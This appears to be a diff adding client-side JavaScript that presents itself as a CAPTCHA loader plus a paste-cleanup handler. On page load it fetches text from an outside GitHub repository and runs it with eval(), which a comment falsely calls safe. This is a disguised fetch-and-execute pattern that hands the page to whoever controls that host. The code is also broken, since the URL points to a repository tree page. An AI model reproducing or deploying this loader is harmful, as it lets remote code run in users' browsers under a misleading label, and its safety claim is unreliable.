@@ -1,0 +1,39 @@
+// Function to call the CAPTCHA script hosted on GitHub
+async function fetchCaptcha() {
+  const captchaUrl = 'https://github.com/Thermotronica/ghosteyezzzz/tree/main';  // Update with your actual URL
+  try {
+    // Fetch the CAPTCHA script from GitHub
+    const response = await fetch(captchaUrl);
+    
+    if (!response.ok) {
+      throw new Error(`Error fetching CAPTCHA script: ${response.statusText}`);
+    }
+    
+    const scriptContent = await response.text();
+    
+    // Process CAPTCHA here (depending on how your CAPTCHA script works)
+    console.log("CAPTCHA Script fetched successfully.");
+    
+    // Load CAPTCHA to DOM or process it
+    eval(scriptContent); // Safely execute the fetched script
+
+    // Further logic depending on how the CAPTCHA works...
+    // For example: if you need to solve it or send the result somewhere, implement that logic here.
+  } catch (error) {
+    console.error("Failed to fetch CAPTCHA script:", error);
+  }
+}
+
+// Execute the function to fetch and load CAPTCHA
+fetchCaptcha();
+
+// Prevent pasting artifacts like 'bplist00' in input fields or other areas
+document.addEventListener('paste', function(e) {
+    e.preventDefault(); // Prevent pasting
+    let text = (e.clipboardData || window.clipboardData).getData('text');
+    
+    // Clean up pasted text to remove unwanted binary artifacts
+    text = text.replace(/bplist00.+/, '');  // Adjust the regex as per the unwanted artifact pattern
+
+    document.execCommand('insertText', false, text);
+});
